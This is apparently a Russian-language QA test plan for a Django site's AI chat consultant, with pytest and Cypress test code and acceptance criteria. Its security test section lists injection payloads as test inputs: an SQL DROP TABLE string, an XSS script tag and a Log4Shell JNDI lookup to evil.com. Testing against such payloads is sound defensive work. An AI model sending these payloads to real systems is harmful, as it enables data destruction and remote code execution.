# 🧪 КОМПЛЕКСНЫЙ ПЛАН ТЕСТИРОВАНИЯ AI КОНСУЛЬТАНТА

**Тестировщик:** Профессиональный QA Engineer
**Дата:** 21 Ноября 2025
**Версия системы:** UnitySphere AI Consultant v2.0

---

## 📊 ОБЗОР СИСТЕМЫ

### ✅ **РАБОЧИЕ КОМПОНЕНТЫ**
- Основной сайт: http://localhost:8001 и http://localhost:8002
- Демо страница AI: http://localhost:8002/ai-demo/
- API эндпоинты: /api/v1/ai/*
- AI виджет: полнофункционален
- Rate limiting: 30 запросов/минуту
- Файловая структура: корректна

### ⚠️ **ОБНАРУЖЕННЫЕ ПРОБЛЕМЫ**
1. **Critical:** Rate limiting decorator ошибка в основном AI API
2. **High:** JSON parsing ошибки в simple-chat API
3. **Medium:** CKEditor security warning
4. **Low:** Deprecation warnings для Allauth

---

## 🎯 СТРАТЕГИЯ ТЕСТИРОВАНИЯ

### **УРОВНИ ТЕСТИРОВАНИЯ**
1. **UNIT Тесты** - Проверка отдельных функций
2. **INTEGRATION Тесты** - Взаимодействие компонентов
3. **API Тесты** - End-to-end проверка API
4. **UI Тесты** - Работоспособность виджета
5. **PERFORMANCE Тесты** - Нагрузочное тестирование
6. **SECURITY Тесты** - Безопасность и уязвимости
7. **COMPATIBILITY Тесты** - Кросс-браузерность

---

## 🔧 1. UNIT ТЕСТЫ (Простые компоненты)

### **Цель:** Проверка базовой логики AI

**Тест-кейсы:**
```python
# ai_consultant/tests/test_ai_logic.py
1. test_message_parsing() - корректность парсинга сообщений
2. test_keyword_detection() - определение намерений
3. test_response_generation() - генерация ответов
4. test_rate_limiting_logic() - логика ограничений
5. test_message_validation() - валидация входных данных
```

**Ожидаемые результаты:**
- ✅ Распознавание 95% ключевых фраз
- ✅ Корректная обработка пустых сообщений
- ✅ Валидация длины сообщений

---

## 🔌 2. INTEGRATION ТЕСТЫ (Взаимодействие компонентов)

### **Цель:** Проверка интеграции AI с Django

**Тест-кейсы:**
```python
# ai_consultant/tests/test_integration.py
1. test_ai_with_database() - сохранение чатов в БД
2. test_session_management() - управление сессиями
3. test_monitoring_integration() - работа с мониторингом
4. test_security_validation() - работа с security middleware
5. test_rate_limiting_integration() - интеграция rate limiting
```

**Ожидаемые результаты:**
- ✅ Сохранение чатов в базу данных
- ✅ Корректная работа сессий
- ✅ Запись в мониторинг

---

## 🌐 3. API ТЕСТЫ (End-to-End)

### **Цель:** Полная проверка API эндпоинтов

**Тест-кейсы:**
```python
# ai_consultant/tests/test_api.py
class TestAIChatAPI:

    def test_welcome_endpoint(self):
        """GET /api/v1/ai/simple-welcome/"""
        response = self.client.get('/api/v1/ai/simple-welcome/')
        assert response.status_code == 200
        assert 'message' in response.json()

    def test_chat_creation_club(self):
        """POST /api/v1/ai/simple-chat/ - создание клуба"""
        response = self.client.post('/api/v1/ai/simple-chat/', {
            'message': 'Помоги создать клуб'
        })
        assert response.status_code == 200
        data = response.json()
        assert 'создать клуб' in data['message'].lower()
        assert 'сессия' in data['message'].lower()

    def test_chat_search_clubs(self):
        """POST /api/v1/ai/simple-chat/ - поиск клубов"""
        response = self.client.post('/api/v1/ai/simple-chat/', {
            'message': 'Найди интересные клубы'
        })
        assert response.status_code == 200
        data = response.json()
        assert 'клуб' in data['message'].lower()

    def test_empty_message_validation(self):
        """Валидация пустых сообщений"""
        response = self.client.post('/api/v1/ai/simple-chat/', {
            'message': ''
        })
        assert response.status_code == 400

    def test_rate_limiting(self):
        """Тест rate limiting"""
        for i in range(35):  # Превышаем лимит в 30
            response = self.client.post('/api/v1/ai/simple-chat/', {
                'message': f'Тестовое сообщение {i}'
            })
        if i >= 30:
            assert response.status_code == 429  # Too Many Requests
```

---

## 🖥️ 4. UI ТЕСТЫ (Интерфейс виджета)

### **Цель:** Проверка фронтенд части

**Тест-кейсы:**
```javascript
// tests/frontend/ai_widget_test.js
describe('AI Widget UI Tests', () => {

    test('Widget initialization', () => {
        expect(window.aiChatWidgetV2).toBeDefined();
        expect(document.getElementById('ai-chat-widget')).toBeTruthy();
    });

    test('Widget open/close functionality', () => {
        // Открытие виджета
        window.aiChatWidgetV2.openChat();
        expect(document.querySelector('.ai-chat-container')).toHaveClass('open');

        // Закрытие виджета
        window.aiChatWidgetV2.closeChat();
        expect(document.querySelector('.ai-chat-container')).not.toHaveClass('open');
    });

    test('Message sending', () => {
        const testMessage = 'Привет! Помоги создать клуб';

        // Отправка сообщения
        window.aiChatWidgetV2.sendMessage(testMessage);

        // Проверяем, что сообщение добавлено в чат
        const messages = document.querySelectorAll('.chat-message');
        const lastMessage = messages[messages.length - 1];
        expect(lastMessage.textContent).toContain(testMessage);
    });

    test('Quick buttons functionality', () => {
        // Проверка быстрых кнопок
        const quickButtons = document.querySelectorAll('.quick-action-button');
        expect(quickButtons.length).toBeGreaterThan(0);

        quickButtons[0].click();
        const userInput = document.querySelector('.chat-input');
        expect(userInput.value).not.toBe('');
    });
});
```

---

## ⚡ 5. PERFORMANCE ТЕСТЫ (Нагрузочное тестирование)

### **Цель:** Проверка производительности под нагрузкой

**Тест-кейсы:**
```python
# tests/performance/test_ai_performance.py
import pytest
import asyncio
import aiohttp
import time

class TestAIPerformance:

    async def test_concurrent_requests(self):
        """Тест одновременных запросов"""
        async with aiohttp.ClientSession() as session:
            tasks = []
            for i in range(100):
                task = session.post('http://localhost:8002/api/v1/ai/test-chat/',
                                     json={'message': f'Тест {i}'})
                tasks.append(task)

            start_time = time.time()
            responses = await asyncio.gather(*tasks)
            end_time = time.time()

            # Проверки
            successful = sum(1 for r in responses if r.status == 200)
            assert successful >= 90  # 90% успешных запросов
            assert (end_time - start_time) < 30  # Меньше 30 секунд

    def test_response_time(self):
        """Тест времени ответа"""
        response = self.client.post('/api/v1/ai/test-chat/', {
            'message': 'Тест производительности'
        })

        assert response.status_code == 200
        assert 'processing_time' in response.json()
        processing_time = float(response.json()['processing_time'].rstrip('s'))
        assert processing_time < 2.0  # Меньше 2 секунд
```

**Метрики производительности:**
- ✅ < 2 секунды среднее время ответа
- ✅ < 30 секунд для 100 одновременных запросов
- ✅ 90+ успешных ответов при нагрузке

---

## 🔒 6. SECURITY ТЕСТЫ (Безопасность)

### **Цель:** Проверка защиты от атак

**Тест-кейсы:**
```python
# tests/security/test_ai_security.py
class TestAISecurity:

    def test_sql_injection_protection(self):
        """Защита от SQL инъекций"""
        malicious_inputs = [
            "'; DROP TABLE ai_consultant_chatsession; --",
            "' OR '1'='1",
            "<script>alert('XSS')</script>",
            "${jndi:ldap://evil.com/a}",
        ]

        for payload in malicious_inputs:
            response = self.client.post('/api/v1/ai/test-chat/', {
                'message': payload
            })

            # Система должна обработать безопасно
            assert response.status_code in [200, 400]
            if response.status_code == 200:
                # Проверяем, что вредоносный код не попал в ответ
                response_text = response.json()['message'].lower()
                assert 'drop table' not in response_text
                assert 'xss' not in response_text

    def test_rate_limiting_abuse(self):
        """Тест защиты от злоупотреблений"""
        # Превышаем лимит запросов
        responses = []
        for i in range(50):  # Превышаем лимит в 30
            response = self.client.post('/api/v1/ai/test-chat/', {
                'message': f'Тестовое сообщение {i}'
            })
            responses.append(response)

        # Проверяем rate limiting
        blocked_responses = sum(1 for r in responses if r.status_code == 429)
        assert blocked_responses >= 10  # Минимум 10 заблокированных

    def test_large_message_protection(self):
        """Защита от слишком больших сообщений"""
        large_message = "x" * 100000  # 100KB сообщение

        response = self.client.post('/api/v1/ai/test-chat/', {
            'message': large_message
        })

        assert response.status_code in [400, 413]  # Bad Request или Payload Too Large
```

---

## 📱 7. COMPATIBILITY ТЕСТЫ (Кросс-браузерность)

### **Цель:** Проверка работы в разных браузерах

**Тест-кейсы:**
```javascript
// tests/compatibility/browser_tests.js
describe('Cross-browser Compatibility', () => {

    ['Chrome', 'Firefox', 'Safari', 'Edge'].forEach(browser => {
        it(`Should work in ${browser}`, () => {
            cy.visit('http://localhost:8002/ai-demo/');

            // Проверка загрузки виджета
            cy.get('#ai-chat-widget', { timeout: 10000 }).should('be.visible');

            // Проверка функциональности
            cy.get('.chat-toggle-btn').click();
            cy.get('.chat-input').should('be.visible');

            // Отправка тестового сообщения
            cy.get('.chat-input').type('Тестовое сообщение');
            cy.get('.chat-send-btn').click();
            cy.get('.chat-message').should('contain', 'Тестовое сообщение');
        });
    });
});
```

---

## 📋 ТЕСТОВЫЕ КЕЙСЫ ДЛЯ ФУНКЦИОНАЛА СОЗДАНИЯ КЛУБОВ

### **SCENARIOS:** Создание клубов

```python
# tests/test_club_creation_scenarios.py
class TestClubCreationScenarios:

    def test_club_creation_detailed_help(self):
        """Детальная помощь в создании клуба"""
        test_inputs = [
            "Хочу создать спортивный клуб",
            "Как создать новый клуб?",
            "Помоги с созданием IT сообщества",
            "Создать клуб для художников",
        ]

        for input_text in test_inputs:
            response = self.client.post('/api/v1/ai/test-chat/', {
                'message': input_text
            })

            assert response.status_code == 200
            response_text = response.json()['message'].lower()

            # Проверяем наличие ключевых шагов
            required_keywords = ['войдите', 'создать клуб', 'название', 'описание', 'загрузите']
            missing_keywords = [kw for kw in required_keywords if kw not in response_text]

            assert len(missing_keywords) <= 2, f"Missing keywords: {missing_keywords}"

    def test_club_categories_suggestions(self):
        """Рекомендации по категориям клубов"""
        response = self.client.post('/api/v1/ai/test-chat/', {
            'message': 'Какие бывают категории клубов?'
        })

        assert response.status_code == 200
        response_text = response.json()['message'].lower()

        # Проверяем упоминание категорий
        categories = ['спортивные', 'творческие', 'образовательные', 'технологические']
        mentioned = [cat for cat in categories if cat in response_text]

        assert len(mentioned) >= 2, "Should mention at least 2 club categories"

    def test_club_promotion_help(self):
        """Помощь в продвижении клуба"""
        response = self.client.post('/api/v1/ai/test-chat/', {
            'message': 'Как привлечь участников в клуб?'
        })

        assert response.status_code == 200
        response_text = response.json()['message'].lower()

        # Проверяем рекомендации по привлечению
        promotion_keywords = ['реклама', 'мероприятия', 'социальные сети', 'партнерство']
        mentioned = [kw for kw in promotion_keywords if kw in response_text]

        assert len(mentioned) >= 2, "Should mention at least 2 promotion methods"
```

---

## 🛠️ ИНСТРУМЕНТЫ ДЛЯ ТЕСТИРОВАНИЯ

### **Backend:**
```bash
# Установка инструментов
pip install pytest pytest-django pytest-asyncio pytest-cov
pip install aiohttp requests-mock
pip install factory-boy faker

# Запуск тестов
pytest ai_consultant/tests/ -v --cov=ai_consultant
pytest ai_consultant/tests/test_api.py -v --cov=ai_consultant
```

### **Frontend:**
```bash
# Установка инструментов
npm install cypress --save-dev

# Запуск UI тестов
npx cypress run --browser chrome
npx cypress run --spec tests/frontend/
```

### **Performance:**
```bash
# Установка инструментов
pip install locust

# Запуск нагрузочного теста
locust -f tests/performance/locustfile.py --host=http://localhost:8002
```

### **Security:**
```bash
# Инструменты
pip install bandit
pip install safety

# Проверка безопасности
bandit -r ai_consultant/
safety check -r requirements.txt
```

---

## 📊 КРИТЕРИИ ПРИЕМКИ

### **SUCCESS КРИТЕРИИ:**
- ✅ 95% unit тестов проходят
- ✅ 90% API тестов проходят
- ✅ 85% UI тестов проходят
- ✅ < 2s среднее время ответа API
- ✅ < 30s для 100 одновременных запросов
- ✅ 0 критических security уязвимостей

### **FAILURE КРИТЕРИИ:**
- ❌ Любой API эндпоинт не работает
- ❌ Rate limiting не работает
- ❌ SQL инъекции или XSS уязвимости
- ❌ > 5s время ответа для простых запросов
- ❌ AI виджет не загружается
- ❌ Потеря данных в базе данных

---

## 📈 ПЛАН ИСПОЛНЕНИЯ

### **PHASE 1: Unit & Integration (1 день)**
1. Написать unit тесты для основных функций
2. Создать integration тесты для БД
3. Проверить валидацию сообщений
4. Тестировать rate limiting логику

### **PHASE 2: API & Security (2 дня)**
1. Создать comprehensive API тесты
2. Реализовать security тесты
3. Проверить сценарии создания клубов
4. Тестировать edge cases и error handling

### **PHASE 3: UI & Performance (2 дня)**
1. Разработать Cypress тесты для виджета
2. Провести нагрузочное тестирование
3. Проверить кросс-браузерность
4. Тестировать демо страницу

### **PHASE 4: Regression & Documentation (1 день)**
1. Полный регрессионный прогон
2. Документация для разработчиков
3. Создать CI/CD pipeline для тестов
4. Финальный отчет и рекомендации

---

## 🔧 НЕПОСРЕДСТВЕННЫЕ ДЕЙСТВИЯ

### **СЕЙЧАС:**
1. ⚠️ **FIX CRITICAL:** Rate limiting decorator ошибка в `/api/v1/ai/chat/`
2. ⚠️ **FIX HIGH:** JSON parsing в `simple-chat` API
3. ✅ Запустить unit тесты для базовой логики

### **ЗА СЛЕДУЮЩИЙ ЧАС:**
1. 📋 Создать структуру тестовых файлов
2. 🔍 Проанализировать основные бизнес-сценарии
3. 🧪 Начать с unit тестов для AI логики

**Начинаем немедленно с критических исправлений!** 🚀